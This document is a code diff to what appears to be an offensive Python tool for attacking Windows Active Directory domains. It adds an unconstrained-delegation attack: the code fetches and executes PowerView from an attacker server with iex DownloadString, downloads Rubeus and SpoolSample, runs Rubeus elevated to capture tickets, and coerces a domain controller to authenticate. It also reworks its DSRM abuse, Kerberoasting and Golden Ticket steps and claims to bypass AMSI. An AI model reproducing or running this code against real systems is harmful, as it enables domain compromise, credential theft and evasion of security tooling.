@@ -1,5 +1,6 @@
 from lib.config import *
 import time,os,sys,subprocess
+import win32com.shell.shell as shell
 
 
 
@@ -61,33 +62,9 @@ def stepFOUR_PrivilegeEsc():
     except Exception as e:
         print(f"{error} No Writeable service executable FOUND")
     
-    print(f"{warning} C- Check abuse Directory Services Restore Mode (DSRM)")
-    time.sleep(1)
-    print(f"{ok} Bypassing AMSI Security...\n")
-    #bypass=configurazione()
-    #command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
-    command1=' Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"'
-    try:
-        value=powershell_commandLine(command1)
-        value=cleanstring(value)
-        value=value.split("\n")
-        dsrmvalue=99
-        for item in value:
-            if "DsrmAdminLogonBehaviour" in item:
-                dsrmvalue=int(item.split(":")[1].strip())
-                if dsrmvalue!=2:
-                    print(f"{error} Is not possible to allow login into DC using DSRM hash")
-                else:
-                    print(f"{ok} DsrmAdminLogonBehaviour has value 2. It is possible use DSRM hash to login into DC")
-                    x=input(f"{ok} When you finished press ENTER..\n")
-        
-        if dsrmvalue == 99:
-            print(f"{error} DsrmAdminLogonBehaviour not present...")
-    except Exception as e:
-        print(f"{error} General error: {e}")
     
     time.sleep(1)
-    print(f"\n{warning} D- Check AS-REP Roasting on the domains...")
+    print(f"\n{warning} C- Check AS-REP Roasting on the domains...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -112,7 +89,7 @@ def stepFOUR_PrivilegeEsc():
 
     time.sleep(1)
     
-    print(f"\n{warning} E- Check abuse Kerberoasting...")
+    print(f"\n{warning} D- Check abuse Kerberoasting...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -156,7 +133,7 @@ def stepFOUR_PrivilegeEsc():
 
     time.sleep(1)
 
-    print(f"\n{warning} F- Check SeBackupPrivilege to Windows PrivEsc...")
+    print(f"\n{warning} E- Check SeBackupPrivilege to Windows PrivEsc...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
@@ -195,11 +172,80 @@ def stepFOUR_PrivilegeEsc():
         print(f"{error} General Error: {e}")
 
 
+    print(f"\n{warning} F- Unconstrained Delegation ")
+    print(f"{ok} For this techniques may be necessary disable AV..")
+    x=input(f"{ok} When you finished press ENTER..\n")
+    print(f"{ok} Bypassing AMSI Security...\n")
+    bypass=configurazione()
+    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
+    command1=command0 + 'Get-NetComputer -UnConstrained | select Name'
+    try:
+        value=powershell_commandLine(command1)
+        undomain=cleanstring(value)
+        print(undomain)
+        undomain=undomain.split("\n")
+        if(len(undomain) == 1):
+                print(f"\n{error} No domain computers which unconstrained delegation FOUND\n")
+        else:
+            print(f"\n{ok} Domain computers which unconstrained delegation FOUND")
+            command1=f"(New-Object Net.WebClient).DownloadFile('http://{IpServer}/Rubeus.exe','C:\\Users\\{username}\\Desktop\\Lelanto\\Rubeus.exe')"
+            value=powershell_commandLine(command1)
+            command=f"C:\\Users\\{username}\\Desktop\\Lelanto\\Rubeus.exe monitor /interval:1"
+            final_command=f'start cmd.exe @cmd /k "{command}"'
+            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ final_command)
+            command1=f"(New-Object Net.WebClient).DownloadFile('http://{IpServer}/SpoolSample.exe','C:\\Users\\{username}\\Desktop\\Lelanto\\SpoolSample.exe')"
+            value=powershell_commandLine(command1)
+            bypass=configurazione()
+            command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
+            command12=command0 + " Get-NetDomain"
+            value=powershell_commandLine(command12)
+            value=cleanstring(value)
+            value_list=value.split("\n")
+            domain=value_list[-1].split(":")[1].rstrip().strip()
+            print(f"Domain: {domain}")
+            DC=input(f"{warning} Insert DC: ")
+            VulnMachine=input(f"{warning} Insert Machine with delegation enables: ")
+            command=f"C:\\Users\\{username}\\Desktop\\Lelanto\\SpoolSample.exe {DC} {VulnMachine}"
+            os.system(command)
+            x=input(f"\n{warning} Press ENTER when the process will finish...")
+            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ f"del C:\\Users\\{username}\\Desktop\\Lelanto\\Rubeus.exe")
+
+
+    except Exception as e:
+        print(f"{error} General Error: {e}")
+
+
+
 def stepFIVE_DomainPersistence():
     print(f"\n{ok} 4-Starting with Domain Persistence...\n")
     print(f"{ok} For this techniques may be necessary disable AV..")
     x=input(f"{ok} When you finished press ENTER..\n")
-    print(f"\n{warning} A- Get Golden Ticket using krbtgt...")
+    print(f"{warning} A- Check abuse Directory Services Restore Mode (DSRM)")
+    time.sleep(1)
+    print(f"{ok} Bypassing AMSI Security...\n")
+    #bypass=configurazione()
+    #command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
+    command1=' Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"'
+    try:
+        value=powershell_commandLine(command1)
+        value=cleanstring(value)
+        value=value.split("\n")
+        dsrmvalue=99
+        for item in value:
+            if "DsrmAdminLogonBehaviour" in item:
+                dsrmvalue=int(item.split(":")[1].strip())
+                if dsrmvalue!=2:
+                    print(f"{error} Is not possible to allow login into DC using DSRM hash")
+                else:
+                    print(f"{ok} DsrmAdminLogonBehaviour has value 2. It is possible use DSRM hash to login into DC")
+                    
+        
+        if dsrmvalue == 99:
+            print(f"{error} DsrmAdminLogonBehaviour not present...")
+    except Exception as e:
+        print(f"{error} General error: {e}")
+    
+    print(f"\n{warning} B- Get Golden Ticket using krbtgt...")
     time.sleep(1)
     print(f"{ok} Bypassing AMSI Security...\n")
     bypass=configurazione()
